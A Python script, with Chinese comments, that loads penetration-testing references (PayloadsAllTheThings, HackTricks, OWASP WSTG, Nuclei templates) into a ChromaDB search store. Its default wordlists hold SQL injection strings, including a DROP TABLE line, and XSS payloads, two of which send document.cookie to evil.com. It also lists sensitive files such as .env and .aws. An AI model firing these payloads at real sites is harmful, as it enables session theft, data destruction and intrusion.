#!/usr/bin/env python3
"""
知识库导入工具 - ChromaDB 版本（不依赖 OpenViking）

将所有静态知识源导入到 ChromaDB，支持语义搜索。

使用方法:
    python import_to_chromadb.py --all          # 导入全部
    python import_to_chromadb.py --payloads     # PayloadsAllTheThings
    python import_to_chromadb.py --howtohunt    # HowToHunt
    python import_to_chromadb.py --wstg         # OWASP WSTG
    python import_to_chromadb.py --hacktricks   # HackTricks
    python import_to_chromadb.py --nuclei       # Nuclei Templates
    python import_to_chromadb.py --dictionary   # 攻击词表
    python import_to_chromadb.py --verify       # 仅验证搜索
"""

import os
import re
import sys
import json
import io
from pathlib import Path
from typing import List, Tuple, Optional

# 修复 Windows GBK 编码问题
if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

# 将 langGraph/ 加入 sys.path
_project_root = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(_project_root))

import chromadb
import structlog
from chromadb.config import Settings

# 尝试加载 .env（chroma_path 配置）
try:
    from dotenv import load_dotenv
    _env = Path(__file__).resolve().parent.parent / ".env"
    load_dotenv(_env, override=True)
except ImportError:
    pass

logger = structlog.get_logger(__name__)

# ── 路径配置 ──────────────────────────────────────────────────────────
REFERENCE_DIR = Path(__file__).parent / "reference"
CHROMA_PATH = os.getenv("CHROMA_PATH", str(Path(__file__).parent.parent / "data" / "chroma"))

# ── 切割参数 ──────────────────────────────────────────────────────────
_MAX_CHUNK_CHARS = 800
_MIN_CHUNK_CHARS = 100


# ═══════════════════════════════════════════════════════════════════════
# ChromaDB 客户端
# ═══════════════════════════════════════════════════════════════════════

class ChromaImporter:
    """ChromaDB 知识导入器"""

    def __init__(self, chroma_path: str = None):
        self.chroma_path = chroma_path or CHROMA_PATH
        self.client: Optional[chromadb.PersistentClient] = None
        self.collections = {}

    def initialize(self) -> bool:
        """初始化 ChromaDB 客户端和集合。"""
        os.environ["ANONYMIZED_TELEMETRY"] = "false"
        import logging
        logging.getLogger("chromadb.telemetry.product.posthog").setLevel(logging.CRITICAL)

        try:
            Path(self.chroma_path).mkdir(parents=True, exist_ok=True)
            self.client = chromadb.PersistentClient(
                path=self.chroma_path,
                settings=Settings(anonymized_telemetry=False),
            )
            # 创建集合：payloads, howtohunt, wstg, hacktricks, nuclei, general
            for name in ("payloads", "howtohunt", "wstg", "hacktricks", "nuclei", "general"):
                try:
                    self.collections[name] = self.client.get_or_create_collection(name=name)
                except Exception as e:
                    logger.warning(f"Failed to create collection {name}: {e}")

            print(f"[OK] ChromaDB 已就绪: {self.chroma_path}")
            print(f"   集合: {list(self.collections.keys())}")
            return True
        except Exception as e:
            print(f"[FAIL] ChromaDB 初始化失败: {e}")
            return False

    def get_collection(self, name: str):
        """获取或创建集合（自动降级到 general）。"""
        if name not in self.collections:
            try:
                self.collections[name] = self.client.get_or_create_collection(name=name)
            except Exception:
                name = "general"
        return self.collections.get(name, self.collections.get("general"))

    def add_chunk(self, collection_name: str, title: str, content: str,
                  source: str = "", tags: str = "", extra_meta: dict = None) -> int:
        """添加单个知识块到 ChromaDB。返回成功数。"""
        import uuid
        collection = self.get_collection(collection_name)
        if not collection:
            return 0

        doc_id = str(uuid.uuid4())
        meta = {
            "title": title[:200],
            "source": source[:100],
            "tags": tags[:200],
        }
        if extra_meta:
            for k, v in extra_meta.items():
                meta[k] = str(v)[:200]

        try:
            collection.add(ids=[doc_id], documents=[content[:5000]], metadatas=[meta])
            return 1
        except Exception as e:
            logger.error(f"Failed to add chunk: {e}")
            return 0

    def count_all(self) -> dict:
        """统计所有集合的文档数。"""
        counts = {}
        for name, coll in self.collections.items():
            try:
                counts[name] = coll.count()
            except Exception:
                counts[name] = 0
        return counts

    def search(self, query: str, collection_name: str = None, limit: int = 3) -> list:
        """测试搜索。"""
        results = []
        names = [collection_name] if collection_name else list(self.collections.keys())
        for name in names:
            coll = self.collections.get(name)
            if not coll:
                continue
            try:
                raw = coll.query(query_texts=[query], n_results=limit)
                ids = (raw.get("ids") or [[]])[0]
                docs = (raw.get("documents") or [[]])[0]
                metas = (raw.get("metadatas") or [[]])[0]
                for i, doc_id in enumerate(ids):
                    results.append({
                        "collection": name,
                        "id": doc_id,
                        "title": metas[i].get("title", "") if i < len(metas) else "",
                        "content": (docs[i] or "")[:200] if i < len(docs) else "",
                    })
            except Exception as e:
                logger.warning(f"Search failed for {name}: {e}")
        return results


# ═══════════════════════════════════════════════════════════════════════
# 切割函数（复用 import_knowledge.py 的逻辑）
# ═══════════════════════════════════════════════════════════════════════

def chunk_markdown_by_headings(md_path: Path) -> List[Tuple[str, str]]:
    """按 H2/H3 标题切割 Markdown 文件。"""
    try:
        content = md_path.read_text(encoding="utf-8", errors="ignore")
    except Exception:
        return []
    if len(content.strip()) < _MIN_CHUNK_CHARS:
        return []

    file_title = _extract_first_heading(content) or md_path.stem.replace("_", " ").title()

    h2_pattern = re.compile(r'^##\s+(.+)$', re.MULTILINE)
    sections = []
    h2_matches = list(h2_pattern.finditer(content))

    if not h2_matches:
        if len(content.strip()) >= _MIN_CHUNK_CHARS:
            sections.append((file_title, content[:5000]))
        return sections

    for i, match in enumerate(h2_matches):
        heading = match.group(1).strip()
        start = match.start()
        end = h2_matches[i + 1].start() if i + 1 < len(h2_matches) else len(content)
        section_content = content[start:end]
        full_title = f"{file_title} > {heading}"

        if len(section_content) > _MAX_CHUNK_CHARS:
            h3_pattern = re.compile(r'^###\s+(.+)$', re.MULTILINE)
            h3_matches = list(h3_pattern.finditer(section_content))
            if h3_matches:
                for j, h3_match in enumerate(h3_matches):
                    h3_heading = h3_match.group(1).strip()
                    sub_start = h3_match.start()
                    sub_end = h3_matches[j + 1].start() if j + 1 < len(h3_matches) else len(section_content)
                    sub_content = section_content[sub_start:sub_end]
                    sub_title = f"{full_title} > {h3_heading}"
                    if len(sub_content.strip()) >= _MIN_CHUNK_CHARS:
                        sections.append((sub_title, sub_content[:5000]))
            else:
                sections.append((full_title, section_content[:5000]))
        else:
            sections.append((full_title, section_content[:5000]))

    return sections


def _extract_first_heading(content: str) -> str:
    match = re.match(r'^#\s+(.+)$', content, re.MULTILINE)
    return match.group(1).strip() if match else ""


def chunk_nuclei_templates(category_dir: Path) -> List[Tuple[str, str]]:
    """从 Nuclei 模板目录提取 info 块。"""
    import yaml
    yaml_files = list(category_dir.glob("*.yaml")) + list(category_dir.glob("*.yml"))
    if not yaml_files:
        return []

    category = category_dir.name.replace("-", " ").replace("_", " ")
    parent_dir = category_dir.parent.name

    entries = []
    for yf in yaml_files:
        try:
            with open(yf, 'r', encoding='utf-8') as f:
                data = yaml.safe_load(f)
        except Exception:
            continue
        if not isinstance(data, dict):
            continue

        info = data.get("info", {})
        if not isinstance(info, dict):
            continue

        name = info.get("name", yf.stem)
        description = info.get("description", "")
        severity = info.get("severity", "unknown")
        if not description:
            continue

        remediation = info.get("remediation", "")
        references = info.get("reference", [])
        ref_text = ""
        if isinstance(references, list):
            ref_text = "\n参考: " + ", ".join(references[:3])
        tags = info.get("tags", "")
        tag_text = f"\n标签: {tags}" if tags else ""
        rem_text = f"\n修复: {remediation}" if remediation else ""

        text = (
            f"检测项: {name}\n"
            f"严重程度: {severity}\n"
            f"描述: {description}{rem_text}{ref_text}{tag_text}"
        )
        entries.append({"name": name, "text": text})

    chunks = []
    batch_size = 5
    for i in range(0, len(entries), batch_size):
        batch = entries[i:i + batch_size]
        if len(batch) == 1:
            title = f"Nuclei: {parent_dir}/{category} - {batch[0]['name']}"
            chunks.append((title, batch[0]['text']))
        else:
            title = f"Nuclei: {parent_dir}/{category} ({len(batch)} 个模板)"
            combined = "\n\n".join(e['text'] for e in batch)
            chunks.append((title, combined[:5000]))
    return chunks


def chunk_dictionary_wordlist(filepath: Path) -> List[Tuple[str, str]]:
    """将词表文件切割为语义块。"""
    try:
        content = filepath.read_text(encoding="utf-8", errors="ignore")
    except Exception:
        return []
    lines = [l.strip() for l in content.splitlines()
             if l.strip() and not l.startswith("#") and not l.startswith("//")]
    if not lines:
        return []

    category = filepath.stem.replace("_", " ").replace("-", " ")
    description = _dictionary_description(category)
    chunks = []
    batch_size = 50
    for i in range(0, len(lines), batch_size):
        batch = lines[i:i + batch_size]
        title = f"词表: {category} (第{i // batch_size + 1}组)"
        text = f"{description}\n\n" + "\n".join(batch)
        chunks.append((title, text[:5000]))
    return chunks


def _dictionary_description(category: str) -> str:
    descriptions = {
        "username": "常见用户名/登录名/账号名列表，用于暴力破解和字典攻击。",
        "password": "常用密码/弱口令列表，用于密码字典攻击和凭证填充。",
        "parameter": "常见 HTTP 参数名列表，用于参数发现和注入测试。",
        "SQL": "SQL 注入相关关键字/函数名/语法片段，用于 SQLi 测试和绕过。",
        "SSTI": "服务端模板注入 (SSTI) payload 和语法。",
        "webshell": "WebShell 常见文件名/路径/特征，用于后门检测。",
        "JNDI": "JNDI 注入相关 payload，用于 Log4j2 等漏洞利用。",
    }
    for key, desc in descriptions.items():
        if key.lower() in category.lower():
            return desc
    return f"{category} 词表文件，包含渗透测试常用字典条目。"


# ═══════════════════════════════════════════════════════════════════════
# 导入函数
# ═══════════════════════════════════════════════════════════════════════

def import_markdown_dir(importer: ChromaImporter, source_dir: Path, collection: str,
                        label: str) -> int:
    """导入 Markdown 目录到 ChromaDB。"""
    if not source_dir.exists():
        print(f"[WARN]  {label} 目录不存在: {source_dir}")
        return 0

    files = list(source_dir.rglob("*.md"))
    if not files:
        print(f"[WARN]  {label} 无 .md 文件")
        return 0

    print(f"\n>> 导入 {label} ({len(files)} 个文件)...")
    total = 0
    for i, fp in enumerate(files):
        try:
            chunks = chunk_markdown_by_headings(fp)
            for title, content in chunks:
                rel = str(fp.relative_to(source_dir))
                total += importer.add_chunk(
                    collection, title, content,
                    source=rel[:100], tags=label,
                )
            if (i + 1) % 50 == 0:
                print(f"  已处理 {i + 1}/{len(files)}，累计 {total} 块")
        except Exception as e:
            logger.error(f"Failed: {fp}", error=str(e))
    print(f"[OK] {label}: {total} 块")
    return total


def import_payloads(importer: ChromaImporter) -> int:
    """导入 PayloadsAllTheThings。"""
    # 尝试多个可能的路径
    candidates = [
        REFERENCE_DIR / "PayloadsAllTheThings" / "PayloadsAllTheThings-master",
        REFERENCE_DIR / "PayloadsAllTheThings",
    ]
    source = None
    for c in candidates:
        if c.exists():
            source = c
            break
    if not source:
        # clone 后直接就是文件
        source = REFERENCE_DIR / "PayloadsAllTheThings"

    return import_markdown_dir(importer, source, "payloads", "PayloadsAllTheThings")


def import_howtohunt(importer: ChromaImporter) -> int:
    """导入 HowToHunt。"""
    candidates = [
        REFERENCE_DIR / "HowToHunt" / "HowToHunt-master",
        REFERENCE_DIR / "HowToHunt",
    ]
    source = None
    for c in candidates:
        if c.exists() and list(c.rglob("*.md")):
            source = c
            break
    if not source:
        source = REFERENCE_DIR / "HowToHunt"

    return import_markdown_dir(importer, source, "howtohunt", "HowToHunt")


def import_wstg(importer: ChromaImporter) -> int:
    """导入 OWASP WSTG。"""
    wstg_dir = REFERENCE_DIR / "wstg"
    if not wstg_dir.exists():
        print("[WARN]  WSTG 目录不存在")
        return 0

    # 查找 Markdown 文档目录
    docs_candidates = [
        wstg_dir / "document" / "markdown" / "Chinese",
        wstg_dir / "document" / "markdown",
        wstg_dir / "docs",
        wstg_dir / "content",
        wstg_dir,
    ]
    actual_docs = None
    for d in docs_candidates:
        if d.exists() and list(d.rglob("*.md")):
            actual_docs = d
            break

    if not actual_docs:
        print("[WARN]  WSTG Markdown 文件未找到")
        return 0

    return import_markdown_dir(importer, actual_docs, "wstg", "OWASP WSTG")


def import_hacktricks(importer: ChromaImporter) -> int:
    """导入 HackTricks。"""
    ht_dir = REFERENCE_DIR / "hacktricks"
    if not ht_dir.exists():
        print("[WARN]  HackTricks 目录不存在")
        return 0
    return import_markdown_dir(importer, ht_dir, "hacktricks", "HackTricks")


def import_nuclei(importer: ChromaImporter) -> int:
    """导入 Nuclei Templates。"""
    nuclei_dir = REFERENCE_DIR / "nuclei-templates"
    if not nuclei_dir.exists():
        print("[WARN]  Nuclei Templates 目录不存在")
        return 0

    print(f"\n>> 导入 Nuclei Templates...")
    total = 0
    for sub_dir in sorted(nuclei_dir.rglob("*")):
        if not sub_dir.is_dir() or ".git" in str(sub_dir):
            continue
        yaml_files = list(sub_dir.glob("*.yaml")) + list(sub_dir.glob("*.yml"))
        if not yaml_files:
            continue

        try:
            chunks = chunk_nuclei_templates(sub_dir)
            for title, content in chunks:
                rel = str(sub_dir.relative_to(nuclei_dir))
                total += importer.add_chunk(
                    "nuclei", title, content,
                    source=rel[:100], tags="nuclei,cve",
                )
        except Exception as e:
            logger.error(f"Failed nuclei dir: {sub_dir}", error=str(e))

    print(f"[OK] Nuclei Templates: {total} 块")
    return total


def import_dictionary(importer: ChromaImporter) -> int:
    """导入 Dictionary 词表。"""
    dict_dir = REFERENCE_DIR / "Dictionary"
    if not dict_dir.exists():
        print("[WARN]  Dictionary 目录不存在，创建默认词表...")
        dict_dir.mkdir(parents=True, exist_ok=True)
        _create_default_dictionaries(dict_dir)

    print(f"\n>> 导入 Dictionary 词表...")
    total = 0
    for fp in sorted(dict_dir.glob("*.txt")):
        if fp.name == "LICENSE":
            continue
        try:
            chunks = chunk_dictionary_wordlist(fp)
            for title, content in chunks:
                total += importer.add_chunk(
                    "general", title, content,
                    source=f"dictionary/{fp.name}", tags=f"dictionary,{fp.stem}",
                    extra_meta={"type": fp.stem},
                )
            print(f"  {fp.name}: {len(chunks)} 块")
        except Exception as e:
            logger.error(f"Failed dict: {fp}", error=str(e))

    print(f"[OK] Dictionary: {total} 块")
    return total


def _create_default_dictionaries(dict_dir: Path):
    """创建默认词表文件（常用渗透测试字典）。"""
    dictionaries = {
        "sql_injection.txt": (
            "# SQL Injection Payloads\n"
            + "\n".join([
                "' OR '1'='1", "' OR '1'='1' --", "' OR 1=1--", "\" OR \"1\"=\"1",
                "admin'--", "admin' #", "' OR 1=1#", "') OR ('1'='1",
                "1' AND 1=1--", "1' AND 1=2--", "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
                "1 ORDER BY 1--", "1 ORDER BY 100--", "' WAITFOR DELAY '0:0:5'--",
                "1; SLEEP(5)--", "1' AND SLEEP(5)--", "' AND 1=(SELECT COUNT(*) FROM tabname)--",
                "' OR 'x'='x", "admin' OR '1'='1", "1' OR '1'='1",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
                "1; DROP TABLE users--", "1' OR username LIKE '%admin%'--",
                "' HAVING 1=1--", "' GROUP BY columnnames HAVING 1=1--",
            ])
        ),
        "xss_payloads.txt": (
            "# XSS Payloads\n"
            + "\n".join([
                "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>", "<body onload=alert(1)>",
                "'\"><script>alert(1)</script>", "<iframe src=javascript:alert(1)>",
                "<img src=x onerror=prompt(1)>", "<details open ontoggle=alert(1)>",
                "<select autofocus onfocus=alert(1)>", "<video><source onerror=alert(1)>",
                "<marquee onstart=alert(1)>", "<keygen autofocus onfocus=alert(1)>",
                "javascript:alert(1)", "';alert(1);//", "\"-alert(1)-\"",
                "<SCRIPT>alert(1)</SCRIPT>", "<ScRiPt>alert(1)</ScRiPt>",
                "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
                "<img src=x onerror=this.src='http://evil.com/'+document.cookie>",
                "<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>",
            ])
        ),
        "common_directories.txt": (
            "# Common Web Directories\n"
            + "\n".join([
                "admin", "login", "wp-admin", "administrator", "phpmyadmin",
                "backup", "backups", "old", "test", "dev", "staging",
                "api", "api/v1", "api/v2", "graphql", "rest", "soap",
                "upload", "uploads", "files", "images", "img", "assets",
                "css", "js", "static", "public", "private", "config",
                ".git", ".svn", ".hg", ".env", ".aws", ".docker",
                "robots.txt", "sitemap.xml", "crossdomain.xml",
                "console", "dashboard", "portal", "cms", "cpanel",
                "webdav", "web-console", "jmx-console", "manager",
            ])
        ),
        "common_files.txt": (
            "# Common Sensitive Files\n"
            + "\n".join([
                ".env", ".env.example", ".env.local", ".env.production",
                ".git/config", ".git/HEAD", ".svn/entries",
                "web.config", "web.xml", "app.config", "application.properties",
                "wp-config.php", "config.php", "config.yml", "config.json",
                "database.yml", "database.json", "settings.py", "settings.php",
                "Dockerfile", "docker-compose.yml", "Makefile",
                "package.json", "package-lock.json", "yarn.lock",
                "composer.json", "composer.lock", "Gemfile", "Gemfile.lock",
                "phpinfo.php", "info.php", "test.php", "debug.php",
                "server-status", "server-info", "trace.axd",
                "crossdomain.xml", "clientaccesspolicy.xml",
            ])
        ),
    }

    for filename, content in dictionaries.items():
        filepath = dict_dir / filename
        if not filepath.exists():
            filepath.write_text(content, encoding="utf-8")
            print(f"  创建默认词表: {filename}")


# ═══════════════════════════════════════════════════════════════════════
# 验证
# ═══════════════════════════════════════════════════════════════════════

def verify_search(importer: ChromaImporter):
    """验证知识库搜索功能。"""
    print("\n" + "=" * 60)
    print(">> 验证搜索")
    print("=" * 60)

    test_queries = [
        ("SQL injection union select", "payloads"),
        ("authentication bypass", "howtohunt"),
        ("XSS reflected", "wstg"),
        ("privilege escalation linux", "hacktricks"),
        ("CVE RCE critical", "nuclei"),
        ("common username password", "general"),
        ("SSRF internal metadata", None),
    ]

    for query, collection in test_queries:
        results = importer.search(query, collection, limit=2)
        if results:
            titles = [r['title'][:60] for r in results[:2]]
            print(f"  [OK] '{query}' → {', '.join(titles)}")
        else:
            print(f"  [MISS] '{query}' → 无结果 (集合可能为空)")


# ═══════════════════════════════════════════════════════════════════════
# 主函数
# ═══════════════════════════════════════════════════════════════════════

def main():
    args = sys.argv[1:]
    do_all = "--all" in args or not args
    do_payloads = "--payloads" in args
    do_howtohunt = "--howtohunt" in args
    do_wstg = "--wstg" in args
    do_hacktricks = "--hacktricks" in args
    do_nuclei = "--nuclei" in args
    do_dict = "--dictionary" in args or "--dict" in args
    do_verify = "--verify" in args

    if do_all:
        do_payloads = do_howtohunt = do_wstg = do_hacktricks = do_nuclei = do_dict = True

    print("\n" + "=" * 60)
    print(">> 知识库导入工具 (ChromaDB)")
    print("=" * 60)
    print(f"存储路径: {CHROMA_PATH}")
    print(f"参考数据: {REFERENCE_DIR}")

    # 初始化
    importer = ChromaImporter(CHROMA_PATH)
    if not importer.initialize():
        return 1

    if do_verify:
        verify_search(importer)
        return 0

    results = {}

    if do_payloads:
        results["PayloadsAllTheThings"] = import_payloads(importer)

    if do_howtohunt:
        results["HowToHunt"] = import_howtohunt(importer)

    if do_wstg:
        results["OWASP_WSTG"] = import_wstg(importer)

    if do_hacktricks:
        results["HackTricks"] = import_hacktricks(importer)

    if do_nuclei:
        results["Nuclei_Templates"] = import_nuclei(importer)

    if do_dict:
        results["Dictionary"] = import_dictionary(importer)

    # 总结
    print("\n" + "=" * 60)
    print("== 导入完成总结")
    print("=" * 60)
    total = 0
    for name, count in results.items():
        print(f"  - {name}: {count} 块")
        total += count
    print(f"  - 总计: {total} 块")
    print(f"\n  ChromaDB 集合统计:")
    for name, count in importer.count_all().items():
        print(f"    {name}: {count} 文档")
    print("=" * 60)

    # 验证
    verify_search(importer)

    return 0


if __name__ == "__main__":
    sys.exit(main())
